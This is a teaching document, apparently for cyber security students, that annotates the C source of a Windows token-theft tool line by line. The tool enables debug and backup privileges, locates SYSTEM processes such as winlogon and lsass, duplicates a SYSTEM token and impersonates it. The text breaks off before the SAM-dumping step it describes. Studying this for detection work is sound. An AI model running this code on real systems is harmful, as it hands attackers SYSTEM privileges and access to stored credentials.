# Shadow Token Theft Tool — Complete Line-by-Line Documentation

> **Target Audience:** Cert IV Cyber Security students  
> **Context:** Red Team / Advanced Persistent Threat (APT) simulation  
> **Technique:** Token theft, impersonation, and privilege escalation  
> **ATT&CK Mapping:** T1134.001 (Token Impersonation/Theft), T1003.002 (OS Credential Dumping: SAM), T1078 (Valid Accounts)

---

## 1. Overview

This program, `TokenVault.exe`, is a **privilege escalation and credential access tool** that demonstrates how an attacker with administrative privileges can:

1. **Enable critical privileges** (`SeDebugPrivilege` and `SeBackupPrivilege`) in their own process token.
2. **Find a process running as `NT AUTHORITY\SYSTEM`** by scanning all running processes.
3. **Open that process and steal (duplicate) its access token** — the kernel object representing the process's security context.
4. **Impersonate the SYSTEM token** to execute subsequent operations with SYSTEM privileges.
5. **Dump the SAM registry hive** (containing password hashes) and access the physical disk as proof of SYSTEM-level access.
6. **Clean up** by reverting impersonation and closing handles.

This technique is a cornerstone of post-exploitation activity. Once an attacker has admin privileges on a machine, token theft is one of the most reliable ways to achieve full SYSTEM access — the highest privilege level on a Windows workstation. From there, they can dump credentials, install rootkits, or manipulate the system at the kernel level.

> ⚠️ **Educational Purpose Only:** This code is provided for cyber security training, detection engineering, and defensive analysis. Understanding token manipulation is essential for detecting credential theft and building effective endpoint defences.

---

## 2. Line-by-Line Breakdown

### 2.1 Header Includes and Library Pragma

```c
#include <windows.h>
```
- **Line meaning:** Includes the main Windows API header file.
- **Concept:** `windows.h` is the master header that declares virtually every Windows API function, data type, structure, constant, and macro. It pulls in declarations for `OpenProcessToken`, `DuplicateTokenEx`, `ImpersonateLoggedOnUser`, `CreateToolhelp32Snapshot`, `RegSaveKeyA`, `CreateFileA`, and thousands of others.
- **Why it's needed:** Without this header, the compiler would have no knowledge of Windows-specific types like `HANDLE`, `DWORD`, `TOKEN_PRIVILEGES`, or functions like `OpenProcess`.

```c
#include <stdio.h>
```
- **Line meaning:** Includes the C Standard Input/Output library.
- **Concept:** Part of the ISO C standard library. Provides `printf()` for console output, `sprintf()` for string formatting, `fopen()`/`fclose()` for file operations, etc.
- **Why it's needed:** The program uses `printf()` extensively to report status to the operator (`[*]`, `[+]`, `[-]`, `[!]` prefixes).

```c
#include <string.h>
```
- **Line meaning:** Includes string manipulation functions.
- **Concept:** Provides `strcmp()`, `strcpy()`, `strlen()`, `strcat()`, `memset()`, etc.
- **Why it's needed:** This program uses `_stricmp()` (case-insensitive string comparison, declared in `string.h`) to match process names, and `strcmp()` to compare usernames.

```c
#include <tlhelp32.h>
```
- **Line meaning:** Includes the Toolhelp32 API declarations.
- **Concept:** `tlhelp32.h` defines structures and functions for creating snapshots of running processes, threads, modules, and heaps. It's the standard way to enumerate processes in user-mode on Windows.
- **Why it's needed:** `CreateToolhelp32Snapshot`, `PROCESSENTRY32`, `Process32First`, and `Process32Next` are all declared in this header.

```c
#include <stdlib.h>
```
- **Line meaning:** Includes the C Standard Library general utilities.
- **Concept:** Provides `malloc()` (memory allocation), `free()` (memory deallocation), `exit()`, `atoi()`, `rand()`, etc.
- **Why it's needed:** This program dynamically allocates memory with `malloc()` to hold token user information of variable size.

```c
#pragma comment(lib, "advapi32.lib")
```
- **Line meaning:** Tells the Microsoft Visual C++ linker to automatically link against `advapi32.lib`.
- **Concept:** `#pragma comment` is a Microsoft-specific compiler directive. The `lib` parameter adds this import library to the link command automatically, so the programmer doesn't need to configure linker settings manually.
- **What is advapi32.dll:** The **Advanced Windows API** DLL. It contains the security and service APIs, including:
  - `OpenProcessToken`, `DuplicateTokenEx`, `ImpersonateLoggedOnUser`
  - `LookupPrivilegeValueA`, `AdjustTokenPrivileges`
  - `RegSaveKeyA`, `LookupAccountSidA`
  - `OpenSCManagerA`, `CreateServiceA` (not used here but in the same DLL)
- **Why it's needed:** Without linking this library, every security and registry function would cause an "unresolved external symbol" linker error.

---

### 2.2 The `FindSystemProcess()` Function

```c
int FindSystemProcess(const char* name)
```
- **Line meaning:** Declares a function that takes a process name string and returns an integer (the PID if found, 0 otherwise).
- **Concept — function declaration:** In C, you must declare a function's return type, name, and parameters before using it. This function is defined before `main()`, so no separate prototype is needed.
- **Concept — `const char* name`:** A pointer to a constant character array. The `const` keyword promises that this function will NOT modify the string passed to it. This is good practice for input parameters.
- **Return value:** The Process ID (PID) as an integer, or `0` if no matching SYSTEM-owned process is found.

```c
{
```
- **Line meaning:** Opens the function body.

---

#### 2.2.1 Creating a Process Snapshot

```c
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
```
- **Line meaning:** Creates a snapshot (a frozen copy) of all currently running processes.
- **Concept — `HANDLE`:** A Windows handle is an opaque reference to a kernel object. Think of it as a ticket or ID number that the operating system gives you to reference something it manages in kernel memory. You cannot directly access the object; you must use the handle with API functions.
- **Function signature:** `HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);`
- **Parameter 1 — `TH32CS_SNAPPROCESS`:** A flag constant (value `0x00000002`) that tells the function to include all processes in the snapshot. Other flags include `TH32CS_SNAPTHREAD`, `TH32CS_SNAPMODULE`, etc.
- **Parameter 2 — `0`:** When taking a process snapshot, this parameter is ignored and must be `0`.
- **What happens internally:** The kernel briefly pauses process creation/termination, copies the process list into a kernel buffer, and returns a handle to that snapshot. The snapshot is a **consistent point-in-time view** — even if processes start or exit afterwards, the snapshot remains unchanged.
- **Why use a snapshot:** Enumerating processes by repeatedly calling `EnumProcesses` or reading `NtQuerySystemInformation` can miss processes or see them in inconsistent states. A snapshot ensures consistency.

---

#### 2.2.2 Declaring the Process Entry Structure

```c
    PROCESSENTRY32 pe = { sizeof(pe) };
```
- **Line meaning:** Declares a `PROCESSENTRY32` structure named `pe` and initialises its first member (`dwSize`) to the size of the structure itself.
- **Concept — structure in C:** A `struct` is a composite data type that groups related variables under one name. `PROCESSENTRY32` groups all the information about a single process.
- **Concept — `sizeof` operator:** A compile-time operator that returns the size (in bytes) of a type or variable. `sizeof(pe)` = `sizeof(PROCESSENTRY32)`.
- **Why set `dwSize` first:** This is a Windows API pattern. Many API functions that fill structures require the caller to set the `dwSize` member first so Windows knows which version of the structure is being used (for backwards compatibility). If `dwSize` doesn't match what the API expects, the call fails.
- **`PROCESSENTRY32` members include:**
  - `dwSize` — size of this structure
  - `cntUsage` — reference count (always 0)
  - `th32ProcessID` — the PID
  - `th32DefaultHeapID` — process default heap ID
  - `th32ModuleID` — module ID (always 0)
  - `cntThreads` — number of threads in the process
  - `th32ParentProcessID` — PID of the parent process
  - `pcPriClassBase` — base priority class
  - `dwFlags` — reserved
  - `szExeFile` — null-terminated executable name (max 260 chars)

```c
    int found = 0;
```
- **Line meaning:** Declares an integer variable named `found` and initialises it to `0`.
- **Purpose:** Acts as both a flag (have we found a matching process?) and the return value (stores the PID when found). `0` is used as "not found" because PID 0 is the System Idle Process, which is not a real process and cannot be opened.

---

#### 2.2.3 Walking the Process List

```c
    if (Process32First(hSnap, &pe)) {
```
- **Line meaning:** Retrieves information about the FIRST process in the snapshot, and checks if the call succeeded.
- **Function signature:** `BOOL Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);`
- **Parameters:**
  - `hSnap` — handle to the snapshot created earlier
  - `&pe` — address of the `PROCESSENTRY32` structure to fill. The `&` (address-of) operator passes the memory location where Windows should write the process data.
- **Return value:** Returns `TRUE` (non-zero) if successful, `FALSE` (0) if the snapshot is empty or invalid.
- **Concept — walking a linked list:** The snapshot internally stores processes in a linked list. `Process32First` gets the head of the list. `Process32Next` (below) moves to subsequent entries.

```c
        do {
```
- **Line meaning:** Begins a `do...while` loop that iterates through ALL processes in the snapshot.
- **Concept — `do...while`:** A post-test loop. The body ALWAYS executes at least once, and then the condition at the `while` is checked. This is appropriate here because we've already called `Process32First` successfully, so there's at least one process to examine.

---

#### 2.2.4 Matching the Process Name

```c
            if (!_stricmp(pe.szExeFile, name)) {
```
- **Line meaning:** Compares the current process's executable name with the target name, case-insensitively.
- **Concept — `_stricmp`:** The Microsoft-specific "string compare, case-insensitive" function. The leading underscore indicates it's a Microsoft extension (not standard C). Standard C has `strcasecmp` on POSIX systems.
  - Returns `0` if strings are equal (ignoring case)
  - Returns negative if first string is lexicographically less
  - Returns positive if first string is lexicographically greater
- **Concept — `!` operator:** Logical NOT. Since `_stricmp` returns `0` for equality, and `0` is "false" in C, we negate it with `!` to make the condition true when strings match.
- **What is `pe.szExeFile`:** The `szExeFile` member of `PROCESSENTRY32` contains the executable filename (e.g., `"winlogon.exe"`, `"services.exe"`, `"notepad.exe"`). The `sz` prefix is Hungarian notation for "zero-terminated string."
- **Why case-insensitive:** Windows filenames are case-insensitive by default (`WinLogOn.EXE` and `winlogon.exe` refer to the same file).

---

#### 2.2.5 Opening the Matched Process

```c
                HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe.th32ProcessID);
```
- **Line meaning:** Opens a handle to the matched process with query-level access.
- **Function signature:** `HANDLE OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);`
- **Parameter 1 — `PROCESS_QUERY_INFORMATION`:** An access right flag (value `0x0400`) that grants permission to query information about the process, including its token. This is LESS powerful than `PROCESS_ALL_ACCESS` but sufficient for our needs.
- **Parameter 2 — `FALSE`:** The handle should NOT be inheritable by child processes. If a child process were created, it wouldn't automatically get access to this handle.
- **Parameter 3 — `pe.th32ProcessID`:** The PID of the process we want to open, from the snapshot entry.
- **Security check:** Windows validates whether the calling process's token has the right to open the target process. Normally, you can only open processes running at your privilege level or lower. However, with `SeDebugPrivilege` (enabled later in `main()`), you can open ANY process, including SYSTEM processes.
- **Return value:** A handle to the process, or `NULL` if access is denied or the PID is invalid.

```c
                if (hProc) {
```
- **Line meaning:** Checks if `OpenProcess` succeeded.

---

#### 2.2.6 Opening the Process Token

```c
                    HANDLE hToken;
```
- **Line meaning:** Declares a variable to hold the token handle.

```c
                    if (OpenProcessToken(hProc, TOKEN_QUERY, &hToken)) {
```
- **Line meaning:** Opens the access token associated with the process and checks for success.
- **Function signature:** `BOOL OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);`
- **Concept — what is a token:** A **token** is a kernel object that represents the security context of a process or thread. It contains:
  - The user's SID (Security Identifier)
  - Group memberships
  - Privileges (like SeDebugPrivilege, SeBackupPrivilege)
  - Logon session information
  - Integrity level
  - And more...
- **Parameter 1 — `hProc`:** Handle to the process whose token we want.
- **Parameter 2 — `TOKEN_QUERY`:** Access right (value `0x0008`) allowing us to query token information (read-only).
- **Parameter 3 — `&hToken`:** Address where the function writes the new token handle.
- **Why tokens matter:** Every process has a primary token that determines what that process is allowed to do. SYSTEM processes have a token belonging to `NT AUTHORITY\SYSTEM`.

---

#### 2.2.7 Querying Token User Information

```c
                        DWORD len = 0;
```
- **Line meaning:** Declares a `DWORD` variable `len` and initialises it to `0`.
- **Purpose:** Will hold the required buffer size for token information.

```c
                        GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
```
- **Line meaning:** Calls `GetTokenInformation` with a `NULL` buffer and size `0`.
- **Concept — the "two-call pattern":** Many Windows APIs that return variable-length data use this idiom:
  1. Call with `NULL` buffer → API returns `FALSE` and sets `len` to the required size
  2. Allocate a buffer of that size
  3. Call again with the real buffer → API fills the data
- **Parameter 1 — `hToken`:** The token handle.
- **Parameter 2 — `TokenUser`:** The type of information requested. `TokenUser` returns the SID of the user associated with the token.
- **Parameter 3 — `NULL`:** No buffer provided (we're just querying the size).
- **Parameter 4 — `0`:** Buffer size is 0.
- **Parameter 5 — `&len`:** Address where the required size is written.
- **Expected result:** This call FAILS (returns `FALSE`) and `GetLastError()` returns `ERROR_INSUFFICIENT_BUFFER` (122), but `len` is set to the number of bytes needed.

```c
                        if (len > 0) {
```
- **Line meaning:** Ensures the API reported a valid size requirement.

---

#### 2.2.8 Allocating Memory and Retrieving Token User

```c
                            PTOKEN_USER tu = (PTOKEN_USER)malloc(len);
```
- **Line meaning:** Allocates `len` bytes of heap memory and casts the result to `PTOKEN_USER`.
- **Concept — `malloc`:** **M**emory **ALLOC**ate. A standard C function that requests a block of memory from the heap (a pool of memory managed by the C runtime). Returns `NULL` if allocation fails.
- **Concept — `PTOKEN_USER`:** A typedef'd pointer type. It means "pointer to a `TOKEN_USER` structure." The cast `(PTOKEN_USER)` tells the compiler to treat the raw memory address returned by `malloc` as pointing to a `TOKEN_USER` structure.
- **Concept — `TOKEN_USER` structure:**
  ```c
  typedef struct _TOKEN_USER {
      SID_AND_ATTRIBUTES User;
  } TOKEN_USER, *PTOKEN_USER;
  ```
  It contains a `SID_AND_ATTRIBUTES` structure, which in turn contains:
  - `Sid` — pointer to the SID
  - `Attributes` — flags (e.g., `SE_GROUP_ENABLED`)
- **Why dynamic allocation:** The size of a SID varies. A SID for a local account might be ~28 bytes; a domain SID could be much larger. We must ask Windows how much space is needed, then allocate exactly that much.

```c
                            if (GetTokenInformation(hToken, TokenUser, tu, len, &len)) {
```
- **Line meaning:** Makes the SECOND call to `GetTokenInformation`, this time with a real buffer, and checks for success.
- **What happens:** Windows copies the token's user information (the SID and attributes) into the memory pointed to by `tu`.

---

#### 2.2.9 Converting SID to Account Name

```c
                                SID_NAME_USE snu;
```
- **Line meaning:** Declares a variable of type `SID_NAME_USE`.
- **Concept — `SID_NAME_USE`:** An enumeration that indicates what type of account a SID represents:
  - `SidTypeUser` — user account
  - `SidTypeGroup` — group account
  - `SidTypeComputer` — computer account
  - `SidTypeWellKnownGroup` — well-known group (like SYSTEM, Administrators)
  - And others...

```c
                                char user[256] = {0}, domain[256] = {0};
```
- **Line meaning:** Declares two character arrays (buffers) for the username and domain name, both initialised to all zeros.
- **Concept — `{0}` initialiser:** Sets the first element to 0; because it's an array initialiser with fewer values than elements, C zero-fills the rest. This ensures the strings are null-terminated even if `LookupAccountSidA` doesn't completely fill them.

```c
                                DWORD uLen = 256, dLen = 256;
```
- **Line meaning:** Declares two `DWORD` variables holding the sizes of the `user` and `domain` buffers.
- **Concept — pass-by-reference for sizes:** Windows APIs that write strings often require you to pass the buffer size. The function may also update this value to the actual length written (including null terminator).

```c
                                if (LookupAccountSidA(NULL, tu->User.Sid, user, &uLen, domain, &dLen, &snu)) {
```
- **Line meaning:** Converts the binary SID into a human-readable account name, and checks for success.
- **Function signature:** `BOOL LookupAccountSidA(LPCSTR lpSystemName, PSID Sid, LPSTR Name, LPDWORD cchName, LPSTR ReferencedDomainName, LPDWORD cchReferencedDomainName, PSID_NAME_USE peUse);`
- **Parameter 1 — `NULL`:** Look up the SID on the local machine. You could pass a remote server name to look up SIDs on a domain controller.
- **Parameter 2 — `tu->User.Sid`:** The SID to look up. The `->` operator dereferences the pointer `tu` and accesses the `User` member, then accesses `Sid` within that. Equivalent to `(*tu).User.Sid`.
- **Parameter 3 — `user`:** Buffer to receive the account name (e.g., `"SYSTEM"`).
- **Parameter 4 — `&uLen`:** Address of the buffer size variable (input/output).
- **Parameter 5 — `domain`:** Buffer to receive the domain name (e.g., `"NT AUTHORITY"`).
- **Parameter 6 — `&dLen`:** Address of the domain buffer size.
- **Parameter 7 — `&snu`:** Receives the SID type enumeration.
- **What it does:** The Local Security Authority (LSA) looks up the SID in the local SAM database or Active Directory and returns the corresponding human-readable name.

---

#### 2.2.10 Checking for SYSTEM Account

```c
                                    if (!strcmp(user, "SYSTEM")) {
```
- **Line meaning:** Checks if the resolved username is exactly `"SYSTEM"`.
- **Concept — `strcmp`:** **STRing COMpare**. Compares two strings lexicographically. Returns `0` if they are identical.
- **Concept — `!` operator:** Negates the result. `strcmp` returns `0` for equality, so `!0` = true.
- **Why `strcmp` (case-sensitive) here:** `LookupAccountSidA` returns canonical names. `"SYSTEM"` is the exact, official name for the `NT AUTHORITY\SYSTEM` account. We use exact matching because we know the expected output.

```c
                                        found = pe.th32ProcessID;
```
- **Line meaning:** Stores the current process's PID in `found`.
- **Why assign the PID:** This both marks that we found a match (`found` is now non-zero) and records WHICH process to use later.

```c
                                    }
```
- Closes the `if (!strcmp(...))` block.

```c
                                }
```
- Closes the `if (LookupAccountSidA(...))` block.

```c
                            }
```
- Closes the `if (GetTokenInformation(...))` block (second call).

```c
                            free(tu);
```
- **Line meaning:** Releases the heap memory allocated by `malloc`.
- **Concept — `free`:** Returns dynamically allocated memory to the heap manager. Failing to `free` memory causes a **memory leak** — the memory remains allocated but unreachable until the program exits.
- **Why free here, not later:** `tu` is no longer needed after this iteration. Freeing immediately minimizes memory usage and prevents leaks if the function returns early.

```c
                        }
```
- Closes the `if (len > 0)` block.

```c
                        CloseHandle(hToken);
```
- **Line meaning:** Closes the token handle.
- **Concept — handle lifecycle:** Every `Open*` should have a matching `CloseHandle` (or equivalent). The kernel maintains a reference count on objects. When the count reaches zero, the kernel can destroy the object and reclaim memory.

```c
                    }
```
- Closes the `if (OpenProcessToken(...))` block.

```c
                    CloseHandle(hProc);
```
- **Line meaning:** Closes the process handle.

```c
                    if (found) break;
```
- **Line meaning:** If we found a SYSTEM process, exit the `do...while` loop early.
- **Concept — early exit optimisation:** No need to continue scanning once we've found what we need.

```c
                }
```
- Closes the `if (hProc)` block.

```c
            }
```
- Closes the `if (!_stricmp(...))` block.

```c
        } while (Process32Next(hSnap, &pe));
```
- **Line meaning:** Moves to the next process in the snapshot and continues looping.
- **Function:** `Process32Next` fills `pe` with the next process entry. Returns `FALSE` when there are no more entries.
- **Loop condition:** The `while` at the end evaluates `Process32Next(...)`. As long as it returns `TRUE` (more processes exist), the loop continues.

```c
    }
```
- Closes the `if (Process32First(...))` block.

```c
    CloseHandle(hSnap);
```
- **Line meaning:** Closes the snapshot handle.
- **Why close snapshots:** Snapshots consume kernel memory. While they don't block process operations, they should be released promptly.

```c
    return found;
```
- **Line meaning:** Returns the PID (or 0 if not found) to the caller.

```c
}
```
- Closes the `FindSystemProcess` function.

---

### 2.3 The `EnablePrivilege()` Function

```c
void EnablePrivilege(LPCSTR name)
```
- **Line meaning:** Declares a function that takes a privilege name string and returns nothing.
- **Concept — `void` return type:** This function performs an action but doesn't return a value to the caller.
- **Concept — `LPCSTR`:** **L**ong **P**ointer to a **C**onst **STR**ing. Hungarian notation for "pointer to a constant null-terminated string of ANSI characters." The `const` means the function promises not to modify the string.

```c
{
```
- Opens the function body.

---

#### 2.3.1 Opening the Current Process Token

```c
    HANDLE hToken;
```
- **Line meaning:** Declares a handle variable for the current process's token.

```c
    TOKEN_PRIVILEGES tp;
```
- **Line meaning:** Declares a `TOKEN_PRIVILEGES` structure.
- **Concept — `TOKEN_PRIVILEGES`:** A structure used with `AdjustTokenPrivileges` to enable or disable privileges in a token:
  ```c
  typedef struct _TOKEN_PRIVILEGES {
      DWORD PrivilegeCount;
      LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
  } TOKEN_PRIVILEGES;
  ```

```c
    LUID luid;
```
- **Line meaning:** Declares an `LUID` variable.
- **Concept — `LUID` (Locally Unique IDentifier):** A 64-bit value guaranteed to be unique only on the local system. Windows uses LUIDs to identify privileges internally. Each privilege (like `SeDebugPrivilege`) has a unique LUID on each machine.

```c
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
```
- **Line meaning:** Opens the current process's token with privileges to adjust privileges AND query the token.
- **Concept — `GetCurrentProcess()`:** Returns a pseudo-handle to the current process. This handle doesn't need to be closed and is always valid.
- **Access rights:**
  - `TOKEN_ADJUST_PRIVILEGES` (value `0x0020`): Permission to enable/disable/remove privileges
  - `TOKEN_QUERY` (value `0x0008`): Permission to query token information
  - Combined with bitwise OR (`|`)
- **Why we need `TOKEN_ADJUST_PRIVILEGES`:** To call `AdjustTokenPrivileges` later, we MUST open the token with this access right.

---

#### 2.3.2 Looking Up the Privilege LUID

```c
        if (LookupPrivilegeValueA(NULL, name, &luid)) {
```
- **Line meaning:** Converts a privilege name string to its internal LUID representation.
- **Function signature:** `BOOL LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid);`
- **Parameter 1 — `NULL`:** Look up on the local system.
- **Parameter 2 — `name`:** The privilege name (e.g., `"SeDebugPrivilege"`, `"SeBackupPrivilege"`).
- **Parameter 3 — `&luid`:** Receives the 64-bit LUID.
- **Why lookup is needed:** Privileges are identified by LUIDs internally, not by strings. The string names are human-readable abstractions.
- **Common privilege names:**
  - `SeDebugPrivilege` — debug and adjust memory of any process ("god mode" for processes)
  - `SeBackupPrivilege` — bypass file ACLs for backup operations
  - `SeRestorePrivilege` — bypass file ACLs for restore operations
  - `SeTakeOwnershipPrivilege` — take ownership of any object
  - `SeTcbPrivilege` — act as part of the operating system (most powerful)

---

#### 2.3.3 Enabling the Privilege

```c
            tp.PrivilegeCount = 1;
```
- **Line meaning:** Sets the number of privileges we're modifying to 1.

```c
            tp.Privileges[0].Luid = luid;
```
- **Line meaning:** Sets the LUID of the first (and only) privilege entry to the one we looked up.

```c
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
```
- **Line meaning:** Sets the attribute to `SE_PRIVILEGE_ENABLED`.
- **Concept — `SE_PRIVILEGE_ENABLED`:** A constant (value `0x00000002`) that means "this privilege is active and can be used."
- **Other attributes:**
  - `SE_PRIVILEGE_ENABLED_BY_DEFAULT` — privilege is enabled by default
  - `SE_PRIVILEGE_REMOVED` — privilege has been removed (can't be used)
  - `SE_PRIVILEGE_USED_FOR_ACCESS` — used for auditing

```c
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
```
- **Line meaning:** Applies the privilege change to the token.
- **Function signature:** `BOOL AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);`
- **Parameter 1 — `hToken`:** The token to modify.
- **Parameter 2 — `FALSE`:** Do NOT disable all privileges. Only modify the ones specified in `NewState`.
- **Parameter 3 — `&tp`:** Pointer to the new privilege state.
- **Parameter 4 — `sizeof(tp)`:** Size of the `TOKEN_PRIVILEGES` structure.
- **Parameter 5 — `NULL`:** Don't return the previous state.
- **Parameter 6 — `NULL`:** Don't receive the size needed for previous state.
- **Important caveat:** `AdjustTokenPrivileges` returns `TRUE` even if the privilege doesn't exist in the token. You must call `GetLastError()` to verify. In this code, error checking is omitted for brevity — a production tool should check.
- **What enabling `SeDebugPrivilege` does:** Grants the ability to open ANY process with any access rights, regardless of ACLs. This is how malware opens `lsass.exe` or `winlogon.exe` to steal tokens.

```c
        }
```
- Closes the `if (LookupPrivilegeValueA(...))` block.

```c
        CloseHandle(hToken);
```
- **Line meaning:** Closes the token handle.

```c
    }
```
- Closes the `if (OpenProcessToken(...))` block.

```c
}
```
- Closes the `EnablePrivilege` function.

---

### 2.4 The `main()` Function

```c
int main()
```
- **Line meaning:** The program entry point with no command-line arguments.
- **Concept:** Unlike the lateral movement tool which needs target credentials, this tool operates entirely on the local machine and needs no arguments.

```c
{
```
- Opens the function body.

---

#### 2.4.1 Banner Message

```c
    printf("[*] TokenVault - SYSTEM token theft for credential access\n");
```
- **Line meaning:** Prints an informational banner.
- **Concept — `[*]` prefix:** Standard penetration testing notation for informational/status messages.

---

#### 2.4.2 Enabling Privileges

```c
    EnablePrivilege(SE_DEBUG_NAME);
```
- **Line meaning:** Calls our helper function to enable `SeDebugPrivilege`.
- **Concept — `SE_DEBUG_NAME`:** A Windows constant string defined as `"SeDebugPrivilege"`. Using the constant prevents typos.
- **Why `SeDebugPrivilege` is critical:** This privilege is normally held only by administrators. It allows the holder to open any process with full access, bypassing all security checks. It's the key that unlocks token theft.

```c
    EnablePrivilege(SE_BACKUP_NAME);
```
- **Line meaning:** Enables `SeBackupPrivilege`.
- **Concept — `SE_BACKUP_NAME`:** Constant string `"SeBackupPrivilege"`.
- **Why `SeBackupPrivilege`:** This privilege allows reading ANY file, bypassing NTFS ACLs. It's needed for operations like `RegSaveKey` on sensitive hives, and for reading files we normally wouldn't have access to.

---

#### 2.4.3 Finding a SYSTEM Process

```c
    int pid = FindSystemProcess("winlogon.exe");
```
- **Line meaning:** Searches for `winlogon.exe` running as SYSTEM.
- **Concept — `winlogon.exe`:** The **Windows Logon** process. It handles interactive logons, loading user profiles, and securing the desktop. It always runs as SYSTEM and is present on every interactive Windows session.
- **Why `winlogon.exe` first:** It's a reliable, always-present SYSTEM process.

```c
    if (!pid) pid = FindSystemProcess("services.exe");
```
- **Line meaning:** If `winlogon.exe` wasn't found, try `services.exe`.
- **Concept — `services.exe`:** The **Service Control Manager**. It manages all Windows services and always runs as SYSTEM. It's present on every Windows system.

```c
    if (!pid) pid = FindSystemProcess("lsass.exe");
```
- **Line meaning:** If still not found, try `lsass.exe`.
- **Concept — `lsass.exe`:** The **Local Security Authority Subsystem Service**. It handles authentication, the local security policy, and stores credential material in memory. It always runs as SYSTEM.
- **Why multiple fallbacks:** Under certain configurations (e.g., Server Core, some session configurations), one of these might not be easily accessible. Having fallbacks makes the tool more robust.

```c
    if (!pid) {
```
- **Line meaning:** If ALL searches failed...

```c
        printf("[-] No SYSTEM process found\n");
```
- **Line meaning:** Reports failure.

```c
        return 1;
```
- **Line meaning:** Exits with error.

```c
    }
```
- Closes the error block.

```c
    printf("[+] Found SYSTEM process PID: %d\n", pid);
```
- **Line meaning:** Reports the found PID.
- **Format specifier `%d`:** Signed decimal integer. PID is an `int`.

---

#### 2.4.4 Opening the SYSTEM Process

```c
    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
```
- **Line meaning:** Opens a handle to the SYSTEM process.
- **Access right — `PROCESS_QUERY_INFORMATION`:** Allows querying process information, including opening its token.
- **Why this works now:** Because we enabled `SeDebugPrivilege`, Windows allows us to open ANY process, even SYSTEM processes that normally reject access from non-SYSTEM callers.

```c
    if (!hProc) {
```
- **Line meaning:** Checks for failure.

```c
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
```
- **Line meaning:** Reports the Windows error code.

```c
        return 1;
```
- **Line meaning:** Exits.

```c
    }
```
- Closes the error block.

---

#### 2.4.5 Opening the SYSTEM Token

```c
    HANDLE hSysToken;
```
- **Line meaning:** Declares a handle for the SYSTEM token.

```c
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hSysToken)) {
```
- **Line meaning:** Opens the SYSTEM process's token with specific access rights.
- **Access rights:**
  - `TOKEN_DUPLICATE` (value `0x0002`): Permission to create a duplicate of the token. Required for `DuplicateTokenEx`.
  - `TOKEN_QUERY` (value `0x0008`): Permission to query token information.
- **Why `TOKEN_DUPLICATE`:** We can't directly use the token from `OpenProcessToken` for impersonation in all contexts. Windows requires us to create a duplicate with specific impersonation attributes.

```c
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
```
- **Line meaning:** Reports failure.

```c
        return 1;
```
- **Line meaning:** Exits.

```c
    }
```
- Closes the error block.

---

#### 2.4.6 Duplicating the Token

```c
    HANDLE hDupToken;
```
- **Line meaning:** Declares a handle for the duplicated token.

```c
    if (!DuplicateTokenEx(hSysToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
```
- **Line meaning:** Creates a duplicate of the SYSTEM token suitable for impersonation.
- **Function signature:** `BOOL DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);`
- **Parameter 1 — `hSysToken`:** The source token (the SYSTEM token).
- **Parameter 2 — `MAXIMUM_ALLOWED`:** Request the maximum access rights that the caller is permitted. This is a safe default when you don't know exactly which rights you'll need.
- **Parameter 3 — `NULL`:** No special security attributes for the new token.
- **Parameter 4 — `SecurityImpersonation`:** The **impersonation level** of the new token.
  - **Concept — Impersonation Levels:**
    - `SecurityAnonymous` — cannot impersonate the client
    - `SecurityIdentification` — can identify the client but not impersonate
    - `SecurityImpersonation` — can impersonate the client's security context on the local machine
    - `SecurityDelegation` — can impersonate on remote machines too (requires Kerberos delegation)
  - `SecurityImpersonation` is sufficient for local operations.
- **Parameter 5 — `TokenImpersonation`:** The **token type**.
  - **Concept — Token Types:**
    - `TokenPrimary` — a primary token, used to create new processes
    - `TokenImpersonation` — an impersonation token, used to temporarily adopt another identity within the current thread
  - We choose `TokenImpersonation` because we want to impersonate SYSTEM in our current thread, not spawn a new process.
- **Parameter 6 — `&hDupToken`:** Receives the new token handle.
- **Why duplicate at all:** The original token from `OpenProcessToken` is a primary token reference. For thread impersonation, Windows requires an impersonation token with appropriate attributes. `DuplicateTokenEx` creates exactly what we need.

```c
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
```
- **Line meaning:** Reports failure.

```c
        return 1;
```
- **Line meaning:** Exits.

```c
    }
```
- Closes the error block.

---

#### 2.4.7 Impersonating SYSTEM

```c
    if (!ImpersonateLoggedOnUser(hDupToken)) {
```
- **Line meaning:** Adopts the security context of the duplicated SYSTEM token in the current thread.
- **Function signature:** `BOOL ImpersonateLoggedOnUser(HANDLE hToken);`
- **What happens internally:**
  1. Windows validates that the token can be used for impersonation
  2. The current thread's **impersonation token** is set to the duplicated SYSTEM token
  3. All subsequent security checks in THIS THREAD use the SYSTEM token instead of the process's original token
  4. The thread now has SYSTEM privileges, access rights, and identity
- **Concept — thread vs process tokens:**
  - A **process** has a **primary token** that defines its default security context
  - A **thread** normally inherits the process token
  - A thread can have an **impersonation token** that temporarily overrides the process token for that thread only
  - This is how Windows implements "act on behalf of a user" patterns (e.g., a web server thread handling a request impersonates the end user)
